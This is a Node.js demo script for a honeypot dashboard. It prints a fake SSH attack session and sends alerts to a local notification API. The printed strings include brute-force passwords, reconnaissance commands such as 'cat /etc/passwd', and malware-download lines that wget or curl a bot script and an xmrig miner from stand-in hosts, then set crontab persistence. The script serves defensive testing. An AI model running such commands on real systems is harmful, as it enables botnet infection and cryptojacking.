// ============================================
// simulateSession.js
// Simulates a realistic attack session escalating
// from Brute Force → Reconnaissance → Malware Download
// Watch your dashboard while this runs!
// Run: node demo/simulateSession.js
// ============================================

const BASE_URL = 'http://localhost:5001';

// Realistic attacker IPs and countries
const ATTACKERS = [
  { ip: '185.220.101.45', country: 'Russia',        flag: '🇷🇺' },
  { ip: '45.33.32.156',   country: 'China',         flag: '🇨🇳' },
  { ip: '103.75.190.12',  country: 'Vietnam',       flag: '🇻🇳' },
  { ip: '91.240.118.222', country: 'Ukraine',       flag: '🇺🇦' },
  { ip: '194.165.16.11',  country: 'Netherlands',   flag: '🇳🇱' },
];

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function randomAttacker() {
  return ATTACKERS[Math.floor(Math.random() * ATTACKERS.length)];
}

// ── Send a notification directly ─────────────────────
async function sendAlert(alert) {
  try {
    const res = await fetch(`${BASE_URL}/api/notifications/send`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(alert)
    });
    return await res.json();
  } catch (err) {
    console.error('❌ Alert failed:', err.message);
  }
}

// ── Check backend is alive ────────────────────────────
async function checkBackend() {
  try {
    const res = await fetch(`${BASE_URL}/api/health`);
    const data = await res.json();
    return data.status === 'ok';
  } catch {
    return false;
  }
}

// ── PHASE 1: Brute Force ──────────────────────────────
async function simulateBruteForce(attacker) {
  console.log(`\n⚔️  PHASE 1: Brute Force Attack`);
  console.log(`   Attacker: ${attacker.flag} ${attacker.ip} (${attacker.country})`);
  console.log(`   Trying common passwords...`);

  const passwords = [
    'root', 'admin', '123456', 'password', 
    'admin123', 'root123', 'toor', 'test'
  ];

  for (let i = 0; i < passwords.length; i++) {
    process.stdout.write(`   Attempt ${i + 1}/${passwords.length}: ${passwords[i].padEnd(10)} `);
    await sleep(600);
    console.log('❌ FAILED');
  }

  console.log(`\n   📊 Risk Score: 3/10 — Brute Force detected`);
  console.log(`   👁  Dashboard updating...`);
}

// ── PHASE 2: Login Success + Reconnaissance ───────────
async function simulateReconnaissance(attacker) {
  console.log(`\n⚔️  PHASE 2: Login Success + Reconnaissance`);
  console.log(`   ✅ LOGIN SUCCESS with: root / password123`);
  console.log(`   Attacker is now inside the honeypot...`);
  await sleep(1000);

  const commands = [
    { cmd: 'whoami',           desc: 'checking current user' },
    { cmd: 'uname -a',         desc: 'fingerprinting OS' },
    { cmd: 'cat /etc/passwd',  desc: 'dumping user accounts' },
    { cmd: 'ps aux',           desc: 'listing running processes' },
    { cmd: 'netstat -an',      desc: 'mapping network connections' },
    { cmd: 'ls /',             desc: 'exploring filesystem' },
    { cmd: 'hostname',         desc: 'identifying machine' },
  ];

  for (const c of commands) {
    console.log(`   $ ${c.cmd.padEnd(20)} ← ${c.desc}`);
    await sleep(700);
  }

  console.log(`\n   📊 Risk Score: 7/10 — Reconnaissance detected`);
  console.log(`   🚨 ALERT THRESHOLD CROSSED — firing notification...`);

  // Fire real alert
  const alert = {
    severity: 'high',
    title: `High Risk Session: Reconnaissance Detected`,
    description: `SSH attacker from ${attacker.ip} (${attacker.country}) is performing system reconnaissance — Risk: 7/10, Commands: ${commands.length}`,
    sourceIp: attacker.ip,
    country: attacker.country,
    timestamp: new Date().toISOString(),
    type: 'Reconnaissance'
  };

  await sendAlert(alert);
  console.log(`   📱 Alert sent to Slack/Email/Ntfy!`);
}

// ── PHASE 3: Malware Download ─────────────────────────
async function simulateMalwareDownload(attacker) {
  console.log(`\n⚔️  PHASE 3: Malware Download Attempt`);
  console.log(`   Attacker escalating — attempting to download payload...`);
  await sleep(1000);

  const commands = [
    { cmd: 'wget http://185.220.101.1/bot.sh',     desc: 'downloading botnet script' },
    { cmd: 'curl -O http://evil.com/xmrig',        desc: 'downloading crypto miner' },
    { cmd: 'chmod +x bot.sh',                      desc: 'making executable' },
    { cmd: 'chmod +x xmrig',                       desc: 'making executable' },
    { cmd: 'crontab -e',                           desc: 'setting persistence' },
    { cmd: './xmrig --pool xmr.pool.minergate.com',desc: 'starting crypto miner' },
  ];

  for (const c of commands) {
    console.log(`   $ ${c.cmd.padEnd(45)} ← ${c.desc}`);
    await sleep(800);
  }

  console.log(`\n   📊 Risk Score: 10/10 — CRITICAL: Malware Download`);
  console.log(`   🚨 CRITICAL ALERT — firing notification...`);

  // Fire critical alert
  const alert = {
    severity: 'critical',
    title: `🚨 CRITICAL: Malware Download + Crypto Miner Detected`,
    description: `CRITICAL SSH attack from ${attacker.ip} (${attacker.country}) — Attacker downloaded xmrig crypto miner and set crontab persistence. Risk: 10/10, Commands: ${commands.length + 7}`,
    sourceIp: attacker.ip,
    country: attacker.country,
    timestamp: new Date().toISOString(),
    type: 'Malware Download'
  };

  await sendAlert(alert);
  console.log(`   📱 CRITICAL alert sent to Slack/Email/Ntfy!`);
}

// ── PHASE 4: Second attacker simultaneously ───────────
async function simulateSecondAttacker() {
  const attacker2 = randomAttacker();
  console.log(`\n⚔️  PHASE 4: Second Simultaneous Attacker`);
  console.log(`   New session from ${attacker2.flag} ${attacker2.ip} (${attacker2.country})`);
  console.log(`   Running brute force in parallel...`);
  await sleep(500);

  const alert = {
    severity: 'high',
    title: `Multiple Simultaneous Attacks Detected`,
    description: `Second attacker from ${attacker2.ip} (${attacker2.country}) detected while first attack still active. Coordinated attack pattern suspected.`,
    sourceIp: attacker2.ip,
    country: attacker2.country,
    timestamp: new Date().toISOString(),
    type: 'Brute Force'
  };

  await sendAlert(alert);
  console.log(`   📱 Multi-attacker alert sent!`);
}

// ── MAIN ──────────────────────────────────────────────
async function runDemo() {
  console.log('╔════════════════════════════════════════╗');
  console.log('║     HONEYPOT ATTACK SIMULATION         ║');
  console.log('║     Watch your dashboard!              ║');
  console.log('╚════════════════════════════════════════╝');
  console.log('\n🔍 Checking backend is running...');

  const alive = await checkBackend();
  if (!alive) {
    console.error('❌ Backend not running! Start it first: npm run dev');
    process.exit(1);
  }
  console.log('✅ Backend is live\n');
  console.log('📊 Open your dashboard now: http://localhost:3000');
  console.log('📱 Watch your phone for alerts\n');
  console.log('Starting in 3 seconds...');
  await sleep(3000);

  const attacker = randomAttacker();

  // Run all phases
  await simulateBruteForce(attacker);
  await sleep(2000);

  await simulateReconnaissance(attacker);
  await sleep(2000);

  await simulateMalwareDownload(attacker);
  await sleep(2000);

  await simulateSecondAttacker();

  // Final summary
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║         DEMO COMPLETE                  ║');
  console.log('╠════════════════════════════════════════╣');
  console.log('║  ✅ Brute Force phase shown            ║');
  console.log('║  ✅ Reconnaissance phase shown         ║');
  console.log('║  ✅ Malware Download phase shown       ║');
  console.log('║  ✅ Multi-attacker scenario shown      ║');
  console.log('║  ✅ Alerts fired: Slack/Email/Ntfy     ║');
  console.log('╚════════════════════════════════════════╝');
  console.log('\nCheck your dashboard for all sessions!');
}

runDemo();